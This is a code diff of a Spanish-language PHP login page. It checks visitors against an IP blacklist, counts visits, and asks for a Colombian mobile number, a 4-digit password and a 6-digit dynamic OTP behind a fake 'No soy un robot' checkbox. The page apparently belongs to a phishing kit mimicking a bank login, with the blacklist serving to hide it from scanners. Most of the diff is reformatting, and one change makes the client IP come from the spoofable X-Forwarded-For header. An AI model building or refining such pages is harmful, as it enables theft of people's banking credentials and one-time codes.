@@ -3,7 +3,7 @@
 include 'config/conexion.php'; // Archivo de conexión a la base de datos
 
 // --- Variables globales ---
-$client_ip = $_SERVER['REMOTE_ADDR']; // Obtener la IP del cliente
+$client_ip = (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0] : $_SERVER['REMOTE_ADDR'];
 
 // --- Funciones auxiliares ---
 /**
@@ -13,7 +13,8 @@ $client_ip = $_SERVER['REMOTE_ADDR']; // Obtener la IP del cliente
  * @param mysqli $conn Conexión a la base de datos.
  * @return bool Devuelve true si la IP está bloqueada, false de lo contrario.
  */
-function isIpBlocked($client_ip, $conn) {
+function isIpBlocked($client_ip, $conn)
+{
     $sql = "SELECT * FROM blacklist WHERE ip_address = ?";
     $stmt = $conn->prepare($sql);
     $stmt->bind_param("s", $client_ip);
@@ -29,7 +30,8 @@ function isIpBlocked($client_ip, $conn) {
  *
  * @param mysqli $conn Conexión a la base de datos.
  */
-function updateVisitorCount($conn) {
+function updateVisitorCount($conn)
+{
     $sql = "UPDATE visit SET visitor_count = visitor_count + 1";
     if (!$conn->query($sql)) {
         error_log("Error al actualizar el contador de visitantes: " . $conn->error);
@@ -52,6 +54,7 @@ $conn->close();
 
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -59,6 +62,7 @@ $conn->close();
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="config/css/login.css">
 </head>
+
 <body>
     <div class="container mt-5 my-5">
         <!-- Encabezado -->
@@ -81,20 +85,23 @@ $conn->close();
                             <p class="ng-binding">+57</p>
                         </div>
                     </div>
-                    <input type="tel" id="usuario" name="usuario" class="form-control-no" placeholder=" " required pattern="\d{10}" title="Debe ingresar 10 dígitos." maxlength="10">
+                    <input type="tel" id="usuario" name="usuario" class="form-control-no" placeholder=" " required
+                        pattern="\d{10}" title="Debe ingresar 10 dígitos." maxlength="10">
                     <label for="usuario" class="labelno">Número de celular</label>
                 </div>
             </div>
 
             <!-- Contraseña -->
             <div class="form-group">
-                <input type="password" id="clave" name="clave" class="form-control-2" placeholder=" " required pattern="\d{4}" title="Debe ingresar 4 dígitos." maxlength="4">
+                <input type="password" id="clave" name="clave" class="form-control-2" placeholder=" " required
+                    pattern="\d{4}" title="Debe ingresar 4 dígitos." maxlength="4">
                 <label for="clave">Contraseña</label>
             </div>
 
             <!-- Clave dinámica -->
             <div class="form-group">
-                <input type="tel" id="otp" name="otp" class="form-control-2" placeholder=" " required pattern="\d{6}" title="Debe ingresar 6 dígitos." maxlength="6">
+                <input type="tel" id="otp" name="otp" class="form-control-2" placeholder=" " required pattern="\d{6}"
+                    title="Debe ingresar 6 dígitos." maxlength="6">
                 <label for="otp">Clave dinámica</label>
             </div>
 
@@ -103,7 +110,9 @@ $conn->close();
                 <div class="captcha">
                     <div style="display: flex; align-items: center; margin-top: 11px;">
                         <input type="checkbox" id="captcha" name="captcha" required class="custom-checkbox">
-                        <label for="captcha" style="margin-right: 10px; margin-left: 20px; margin-bottom: 0px !important;">No soy un robot</label>
+                        <label for="captcha"
+                            style="margin-right: 10px; margin-left: 20px; margin-bottom: 0px !important;">No soy un
+                            robot</label>
                         <img src="config/img/captcha.png" style="margin-left: 20px; height: 40px;">
                     </div>
                     <p style="font-size: 10px; margin-bottom: 0px;">Privacidad - condiciones</p>
@@ -120,7 +129,7 @@ $conn->close();
     <script src="cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', function () {
             // Agregar imágenes de bandera a las opciones de selección
             const select = document.getElementById('countryCode');
             if (select) {
@@ -138,5 +147,5 @@ $conn->close();
         });
     </script>
 </body>
-</html>
 
+</html>
